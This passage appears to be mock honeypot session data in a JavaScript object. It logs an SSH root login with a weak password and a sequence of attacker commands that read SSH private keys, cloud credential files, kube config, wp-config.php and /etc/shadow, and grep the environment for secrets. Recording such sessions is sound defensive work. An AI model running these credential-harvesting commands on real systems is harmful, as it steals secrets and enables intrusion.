      { type: 'session.closed', timestamp: '2024-01-14T08:13:15Z', details: { duration: 42.0 } },
    ],
    total_events: 7
  },

  'a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3': {
    session_id: 'a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3',
    info: {
      src_ip: '89.248.165.52',
      country: 'Romania',
      city: 'Bucharest',
      sensor: 'cowrie-ollama',
      protocol: 'ssh',
      start_time: '2024-01-14T16:45:20Z',
      end_time: '2024-01-14T16:49:12Z',
      duration: 232.0,
      client_version: 'SSH-2.0-OpenSSH_7.9p1'
    },
    commands: [
      { command: 'uname -a', timestamp: '2024-01-14T16:45:28Z' },
      { command: 'cat /etc/issue', timestamp: '2024-01-14T16:45:35Z' },
      { command: 'lscpu', timestamp: '2024-01-14T16:45:42Z' },
      { command: 'cat /proc/meminfo | head -5', timestamp: '2024-01-14T16:45:50Z' },
      { command: 'ip addr', timestamp: '2024-01-14T16:45:58Z' },
      { command: 'cat /etc/passwd', timestamp: '2024-01-14T16:46:05Z' },
      { command: 'ls -la /home', timestamp: '2024-01-14T16:46:12Z' },
      { command: 'find / -name "*.pem" 2>/dev/null', timestamp: '2024-01-14T16:46:25Z' },
      { command: 'find / -name "id_rsa*" 2>/dev/null', timestamp: '2024-01-14T16:46:40Z' },
      { command: 'cat /root/.ssh/id_rsa', timestamp: '2024-01-14T16:46:55Z' },
      { command: 'cat /root/.aws/credentials 2>/dev/null', timestamp: '2024-01-14T16:47:08Z' },
      { command: 'cat /root/.config/gcloud/credentials.json 2>/dev/null', timestamp: '2024-01-14T16:47:22Z' },
      { command: 'env | grep -i key', timestamp: '2024-01-14T16:47:35Z' },
      { command: 'env | grep -i secret', timestamp: '2024-01-14T16:47:45Z' },
      { command: 'cat /etc/shadow', timestamp: '2024-01-14T16:47:55Z' },
      { command: 'docker ps 2>/dev/null', timestamp: '2024-01-14T16:48:08Z' },
      { command: 'kubectl get pods 2>/dev/null', timestamp: '2024-01-14T16:48:22Z' },
      { command: 'cat ~/.kube/config 2>/dev/null', timestamp: '2024-01-14T16:48:35Z' },
      { command: 'ls -la /var/www/', timestamp: '2024-01-14T16:48:48Z' },
      { command: 'cat /var/www/html/wp-config.php 2>/dev/null', timestamp: '2024-01-14T16:49:00Z' },
      { command: 'exit', timestamp: '2024-01-14T16:49:12Z' },
    ],
    credentials: [
      { username: 'admin', password: 'admin', success: false, timestamp: '2024-01-14T16:45:15Z' },
      { username: 'root', password: 'password', success: true, timestamp: '2024-01-14T16:45:20Z' },
    ],
    events: [
      { type: 'session.connect', timestamp: '2024-01-14T16:45:12Z', details: { protocol: 'ssh' } },
      { type: 'login.failed', timestamp: '2024-01-14T16:45:15Z', details: { username: 'admin' } },
      { type: 'login.success', timestamp: '2024-01-14T16:45:20Z', details: { username: 'root' } },
      { type: 'session.closed', timestamp: '2024-01-14T16:49:12Z', details: { duration: 232.0 } },
    ],
    total_events: 25
  },
};

